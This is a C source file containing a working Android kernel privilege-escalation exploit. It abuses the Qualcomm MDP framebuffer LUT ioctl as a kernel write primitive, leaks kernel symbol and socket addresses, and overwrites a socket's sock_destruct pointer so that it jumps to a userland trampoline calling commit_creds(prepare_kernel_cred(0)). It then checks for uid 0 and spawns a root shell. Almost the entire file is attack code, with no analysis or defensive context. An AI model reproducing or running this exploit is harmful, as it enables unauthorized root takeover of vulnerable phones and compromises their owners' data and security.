/**#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <linux/netlink.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <stdio.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <stdbool.h>
**/
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ip.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/utsname.h>
#include<sys/prctl.h>


#include <linux/netlink.h>
#include <string.h>
#include <errno.h>
#include <netinet/in.h>
#include <sys/wait.h>
#include <linux/netlink.h>
#include <string.h>
#include <fcntl.h>
#include "exp.h"
#include <sys/system_properties.h>


#define PORT 31337
#define PAGE_OFFSET 0xC0000000 

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;

int verson_offset_buf[3][2]={30,0x17c,34,0x198,310,0x1a8};
int g_netlink_sock;

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

void write_where(int mdp_fd, int mdp_lut_i, int mdp_base, uint32_t content, uint32_t where) {

    printf("[i] Trying to write 0x%08x at 0x%08x\n", content, where);

    if ((content & 0xff000000) != 0) {
        printf("[-] last 8 bits sets, but unable to write them!\n");
        exit(EXIT_FAILURE);
    }

    uint32_t cmap_start_target = (where - mdp_base - MDP_KERNEL_PARAM_OFFSET - 0x400*mdp_lut_i) / 4;

    uint32_t overflown_result = mdp_base + MDP_KERNEL_PARAM_OFFSET + 0x400*mdp_lut_i + cmap_start_target*4;

    printf("[i] Target cmap_start: 0x%08x\n", cmap_start_target);
    printf("[i] Expected VM target address: 0x%08x\n", overflown_result);
    
    uint16_t transp = 0x0;
    uint16_t red = (content & 0x00ff0000) >> 16;
    uint16_t blue = (content & 0x0000ff00) >> 8;
    uint16_t green = (content & 0x000000ff) >> 0;

    printf("[i] transp %01x red %01x blue %01x green %01x\n", transp, red, blue, green);

    struct fb_cmap cmap;

    cmap.start = cmap_start_target;
    cmap.len = 1;
    cmap.transp = &transp;
    cmap.red = &red;
    cmap.blue = &blue;
    cmap.green = &green;

    int res = ioctl(mdp_fd, MSMFB_SET_LUT, &cmap);
    if (res < 0) {
        perror("[-] Failed to trigger MSMFB_SET_LUT ioctl");
        exit(EXIT_FAILURE);
    }
    printf("[+] Wrote 0x%08x to 0x%08x\n", content, where);
}

uint32_t leak_mdp_lut_i(int mdp_fd, int mdp_base) {

    printf("[i] Trying to leak the current value of mdp_lut_i\n");

    //dropzone to leak mdp lut i
    void* dropzone = mmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (dropzone == NULL) {
        perror("[-] Failed to map dropzone\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Successfully mapped dropzone. Address: %p, Size: 0x%08X\n", (void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    memset(dropzone, FILLER_BYTE, USER_MAPPING_SIZE);

    write_where(mdp_fd, 0, mdp_base, 0x00dabeef, (uint32_t) dropzone);


    //Looking for a modification in the buffer
    uint32_t modification = 0;
    void* modification_address = NULL;
    int i;
    for (i=0; i<USER_MAPPING_SIZE; i++) {
        if (((char*)dropzone)[i] != FILLER_BYTE) {
            modification_address = (void*)((uint32_t)dropzone + i);
            modification = *((uint32_t*)modification_address);
            printf("[+] Found modification: 0x%08x at offset: 0x%x (address: %p)\n", modification, i, modification_address);
            break;
        }
    }
    if (modification_address == NULL) {
        printf("[-] Failed to find modification, aborting\n");
        exit(EXIT_FAILURE);
    }

    uint32_t delta = modification_address - dropzone;

    printf("[i] delta write %08x\n", delta);

    uint32_t mdp_lut_i = delta / 0x400;

    if ((delta % 0x400 != 0) || mdp_lut_i > 1) {
        printf("[-] offset not multiple of 0x400 or mdp_lut_i > 1, something went wrong!\n");
        exit(EXIT_FAILURE);
    }

    munmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    return mdp_lut_i;
}

uint32_t get_mdp_base() {

    printf("[i] Trying to leak the value of MDP_BASE\n");

    // /sys/kernel/debug/mdp-dbg/base

    FILE *base;

    base = fopen("/sys/kernel/debug/mdp-dbg/base","r");

    if (!base) {
        printf("[-] Failed to open mdp-dbg/base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    uint32_t mdp_base = 0;

    int res = fscanf(base, "mdp_base  :    %x", &mdp_base);

    if (res != 1) {
        printf("[-] Failed to leak mdp base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    printf("[i] Got mdp_base 0x%08x res %d\n", mdp_base, res);

    fclose(base);

    return mdp_base;
}


//读取内核符号kallsyms 获取关键系统调用的地址
void * get_ksymbol(char *name)
{
        FILE *f = fopen("/proc/kallsyms", "r");
        char c, sym[512];
        void *addr;
        int ret;

        while (fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0) {
                if (!strcmp(sym, name))
                        return addr;
        }
        return NULL;
}

void resolve_kernel_symbols(void)
{
        prepare_kernel_cred     = get_ksymbol("prepare_kernel_cred");
        commit_creds            = get_ksymbol("commit_creds");

        if (!prepare_kernel_cred || !commit_creds)
                errx(1, "couldn't map all kernel symbols");
        printf("prepare_kernel_cred=%p,commit_creds= %p\n",prepare_kernel_cred,commit_creds);
}


int get_destruct_offset(int version)
{
  int i=0,iRet=-1;
  for(i=0;i<3;i++)
  {
  if(verson_offset_buf[i][0]==version)
  {
       iRet=verson_offset_buf[i][1];
  }
  }
  return iRet;

}


/* Get the INET_DIAG cookie for our socket, which contains the low 32 bits
 * of the sock struct address */
unsigned int get_cookie(unsigned int port)
{
    int fd;
    struct sockaddr_nl nladdr;
    struct {
        struct nlmsghdr nlh;
        struct inet_diag_req r;
    } req;
    struct msghdr msg;
    char buf[8192];
    struct iovec iov;
    struct inet_diag_msg *r;

    if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG)) < 0)
        return -1;
    
    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_pid = 0;
    
    req.nlh.nlmsg_len = sizeof(req);
    req.nlh.nlmsg_type = TCPDIAG_GETSOCK;
    req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST;
    req.nlh.nlmsg_pid = 0;
    req.nlh.nlmsg_seq = 123456;
    memset(&req.r, 0, sizeof(req.r));
    req.r.idiag_family = AF_INET;
    req.r.idiag_states = 0xfff;
    req.r.idiag_ext = 0;

    iov.iov_base = &req;
    iov.iov_len = sizeof(req);
    
    msg = (struct msghdr) {
        .msg_name = (void*)&nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    
    if (sendmsg(fd, &msg, 0) < 0) {
        close(fd);
        return -1;  
    }
    
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    
    while (1) {
        int status;
        struct nlmsghdr *h;
            
        msg = (struct msghdr) {
            (void*)&nladdr, sizeof(nladdr),
            &iov, 1, NULL, 0, 0
        };
            
        status = recvmsg(fd, &msg, 0);
            
        if (status < 0) {
            if (errno == EINTR)
                continue;
            close(fd);
            return -1;
        }
            
        if (status == 0) {
            close(fd);
            return -1;
        }
        
        h = (struct nlmsghdr*)buf;
        while (NLMSG_OK(h, status)) {
            if (h->nlmsg_seq == 123456) {
                if (h->nlmsg_type == NLMSG_DONE) {
                    close(fd);
                    return -1;
                }
                
                if (h->nlmsg_type == NLMSG_ERROR) {
                    close(fd);
                    return -1;
                }
                
                r = NLMSG_DATA(h);
                if (r->idiag_family == AF_INET &&
                    ntohs(r->id.idiag_sport) == port)
                    return r->id.idiag_cookie[0];
                
            }
            h = NLMSG_NEXT(h, status);
        }
    }
    close(fd);
    return -1;
}

static int get_kernel_version(char *out_release, char* out_version)
{
 int ret; const char*ptr;
 int count=0;
 char r[32], *bptr;
 struct utsname buf;
 ret =  uname(&buf);

 if(ret < 0)
   return -1; 
 
 strcpy(out_release, buf.release);
 strcpy(out_version, buf.version);

 ptr = buf.release;
 bptr = r;
 memset(r, 0x00, sizeof(r)); 

 
 while(*ptr)
 {
     
      if(*ptr >= '0' && *ptr <= '9')
        {
   
        *bptr++ = *ptr;
      }
    
    
   if(*ptr == '.')
     count++;
     if(count==2)
        break;
   ptr++;
 }

 if(strlen(r) < 1 || !atoi(r))
   return -1; 

 return atoi(r); 
}

/* Get the address of the sock struct for our socket */
unsigned long get_sock_addr(unsigned int port)
{
    FILE *f;
    char buf[1024], path[512];
    unsigned int testport, cookie, a;
    unsigned long addr, b;

    f = fopen("/proc/net/tcp", "r");

    if (f < 0) {
        printf("[*] Failed to open /proc/net/tcp\n");
        return 0;
    }

    while (fgets(buf, 1024, f)) {
        sscanf(buf, "%4d: %08X:%04X %08X:%04X %02X %08X:%08X "
                "%02X:%08lX %08X %5d %8d %lu %d %p %lu %lu %u %u "
                "%d\n",
                &a, &a, &testport, &a, &a, &a, &a, &a, &a, &b,
                &a, &a, &a, &b, &a, (void **)&addr, &b, &b, &a, &a,
                &a);
        if (testport == port) {
            /* If kptr_restrict is on... */
            if (!addr) {
                cookie = get_cookie(port);
                addr = (unsigned long)cookie;// + KERNEL_BASE;
            }
            fclose(f);
            return addr;
        }
    }
    fclose(f);
    return 0;
}

unsigned long get_sock_destruct()
{
    unsigned long target, *payload;
    void *landing;
    struct sockaddr_in addr;
    size_t len;
    char szRelease[256]={0},szVersion[256]={0};
  

    printf("[*] Opening TCP socket...\n");
    g_netlink_sock = socket(AF_INET, SOCK_STREAM, 0);

    if (g_netlink_sock < 0) {
        printf("[*] Failed to open TCP socket.\n");
        return -1;
    }

    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(g_netlink_sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        printf("[*] Failed to bind TCP socket.\n");
        return -1;
    }

    /* Our socket won't appear in /proc/net/tcp unless it's listening */
    if (listen(g_netlink_sock, 1)) {
        printf("[*] Failed to listen on TCP socket.\n");
        return -1;
    }

    printf("[*] Getting socket address from INET_DIAG...\n");
    target = get_sock_addr(PORT);

    if (!target) {
        printf("[*] Failed to get socket address.\n");
        return -1;
    }

  
  int versionCode=get_kernel_version(szRelease,szVersion);
  //versionCode=34,szRelease=3.4.0-perf-g60eefcd,szVersion=#1 SMP PREEMPT Fri Oct 10 18:28:38 UTC 2014
  printf("[*] versionCode=%d,szRelease=%s,szVersion=%s\n",versionCode,szRelease,szVersion);

  int sock_offset=get_destruct_offset(versionCode);
  if(sock_offset>=0)
  {
    target += sock_offset;
    printf("[*] sock_destruct address: %lx\n", target);
    }
   else
    {
    printf("[*] Fail to find sock_destruct address!!!!!!!\n");
    return -1;
  }
    
  return target;
}

uint32_t* mmaping_addr(unsigned int val1,unsigned int val2,unsigned int val3)
{
  
    uint32_t* trampoline = NULL;

    //Allocating the trampoline
    trampoline = (uint32_t*)mmap((void*)TRAMPOLINE_ADDRESS, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (trampoline == NULL) {
        perror("[-] Failed to allocate trampoline");
        return -errno;
    }
    printf("[+] Allocated trampoline\n");

    //printf("[i] Attempting to execute kernel_payload at 0x%08x\n", (uint32_t)&kernel_payload);

    //Writing to the trampoline
    trampoline[0] = val1;//0xE51FF004; //LDR PC, [addr]
    //addr:
    trampoline[1] = val2;//(uint32_t)&kernel_payload;
    trampoline[2] = val3;

    //Flushing the cache (to make sure the I-cache doesn't contain leftovers)
    cacheflush((uint32_t)trampoline & (~0xFFF), 0x1000, 0);

    return trampoline;
}



void kernel_payload()
{
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char const *argv[])
{

    //step1:Opening the device
    int mdp_fd = open("/dev/graphics/fb0", O_RDONLY | O_DSYNC);
    if (mdp_fd < 0) {
        perror("[-] Failed to open /dev/graphics/fb0");
        return -errno;
    }
    printf("[+] Opened mdp driver  success\n");

    //step2:get_mdp_base
    uint32_t mdp_base = get_mdp_base();
    printf("[+] Got mdp_base: 0x%08x\n", mdp_base);

    //step3:get mdp_lut_i value
    uint32_t mdp_lut_i = leak_mdp_lut_i(mdp_fd, mdp_base);
    printf("[+] Got mdp_lut_i: 0x%01x\n", mdp_lut_i);

    // mdp_lut_i will switch between 0 and 1 at each call
    mdp_lut_i = !mdp_lut_i;


    //step4:get kernel_cred  address
    resolve_kernel_symbols();


    //step5:open kernel sock_destruct
    unsigned long sk_addr=get_sock_destruct();


    //step6:build trampoline to exec shellcode
    uint32_t* trampoline = NULL;
    /**
     * The pointer to the function stub which is executed whenever a PPPOLAC
     * socket is closed. This stub contains a short piece of ARM code which jumps
     * to the given address, like so:
     *  LDR PC, addr
     * addr:
     *  DCD <ADDRESS>
    */
    trampoline = mmaping_addr(0xE51FF004,(uint32_t)&kernel_payload,0);

    write_where(mdp_fd, mdp_lut_i, mdp_base, (uint32_t)trampoline, sk_addr);
    printf("[+] Execute Shellcode \n");
    close(g_netlink_sock);
    if (getuid() != 0) {
        printf("[-] failed to get uid 0\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] got r00t!\n");

    close(mdp_fd);
    munmap((void*)TRAMPOLINE_ADDRESS, 0x1000);

    execl("/system/bin/sh", "sh", NULL);


    return 0;
}